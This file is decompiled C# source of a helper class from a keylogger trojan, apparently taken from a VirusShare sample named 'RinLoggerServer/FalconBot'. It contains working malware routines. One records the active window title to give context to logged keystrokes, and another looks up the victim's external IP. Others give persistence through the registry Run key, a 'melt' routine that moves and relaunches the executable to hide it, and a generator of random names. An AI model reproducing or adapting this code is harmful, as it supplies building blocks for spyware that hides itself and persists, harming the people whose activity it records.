// Decompiled with JetBrains decompiler
// Type: RinLoggerServer.RinHelper
// Assembly: FalconBot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FC0A4D36-8302-4B94-AEDD-1F060B64CA11
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Spy.MSIL.KeyLogger.cts-4e3b75704a1bbf80bbb6945bbc162d99427f90d5f48c6d5976ac5b6951b410b6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RinLoggerServer
{
  [StandardModule]
  internal sealed class RinHelper
  {
    private static string LastWindow;

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    public static bool GetActiveWindowTitle(ref string Window)
    {
      string lpString = new string(char.MinValue, 100);
      RinHelper.GetWindowText(RinHelper.GetForegroundWindow(), ref lpString, 100);
      string Right = lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
      if (Operators.CompareString(RinHelper.LastWindow, Right, false) == 0)
        return false;
      Window = Right;
      RinHelper.LastWindow = Window;
      return true;
    }

    public static string GetExternalIP()
    {
      string externalIp;
      try
      {
        externalIp = new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://automation.whatismyip.com/n09230945.asp")).GetResponse()).GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        externalIp = "Unknown";
        ProjectData.ClearProjectError();
      }
      return externalIp;
    }

    public static void RunAtStartup(string ApplicationName, string ApplicationPath)
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
      subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      subKey.SetValue(ApplicationName, (object) ApplicationPath);
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int ExitProcess(uint uExitCode);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int MoveFile(
      [MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName,
      [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName,
      long dwFlags);

    public static void MeltFile(string NewLocation)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        if (!System.IO.File.Exists(NewLocation))
          goto label_3;
label_2:
        num3 = 3;
        System.IO.File.Delete(NewLocation);
label_3:
        num3 = 5;
        string executablePath1 = Application.ExecutablePath;
        string executablePath2 = Application.ExecutablePath;
        int moduleFileName = RinHelper.GetModuleFileName(0, ref executablePath2, 256);
        RinHelper.MoveFile(Strings.Left(executablePath1, moduleFileName), NewLocation, 8L);
label_4:
        num3 = 6;
        Process.Start(NewLocation);
label_5:
        num3 = 7;
        RinHelper.ExitProcess(0U);
        goto label_12;
label_7:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static string RandomNumbers(int minamount, int maxamount)
    {
      Random random = new Random();
      string str1 = (string) null;
      string str2 = RinHelper.ReArrange("1234567890987654321");
      int num1 = random.Next(checked (minamount + 1), maxamount);
      int num2 = 1;
      while (num2 <= num1)
      {
        int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (str2.Length - 2) * VBMath.Rnd()) + 1f)));
        str1 += Conversions.ToString(str2[index]);
        checked { ++num2; }
      }
      return str1;
    }

    public static string RandomVariable(int minamount, int maxamount)
    {
      Random random = new Random();
      string str1 = (string) null;
      string str2 = RinHelper.ReArrange("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM");
      int num1 = random.Next(checked (minamount + 1), maxamount);
      int num2 = 1;
      while (num2 <= num1)
      {
        int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (str2.Length - 2) * VBMath.Rnd()) + 1f)));
        str1 += Conversions.ToString(str2[index]);
        checked { ++num2; }
      }
      return str1;
    }

    public static string RandomMix(int minamount, int maxamount)
    {
      Random random = new Random();
      string str1 = (string) null;
      string str2 = RinHelper.ReArrange(RinHelper.ReArrange("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM") + RinHelper.ReArrange("1234567890987654321"));
      int num1 = random.Next(checked (minamount + 1), maxamount);
      int num2 = 1;
      while (num2 <= num1)
      {
        int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (str2.Length - 2) * VBMath.Rnd()) + 1f)));
        str1 += Conversions.ToString(str2[index]);
        checked { ++num2; }
      }
      return str1;
    }

    public static string ReArrange(string Strings)
    {
      string str1 = "";
      Random random = new Random();
      string str2 = Strings;
      int index = 0;
      int length = str2.Length;
      while (index < length)
      {
        char ch = str2[index];
        int num = random.Next(1, 10);
        if (num < 5)
          str1 = Conversions.ToString(ch) + str1;
        else if (num > 5)
          str1 += Conversions.ToString(ch);
        checked { ++index; }
      }
      return str1;
    }
  }
}
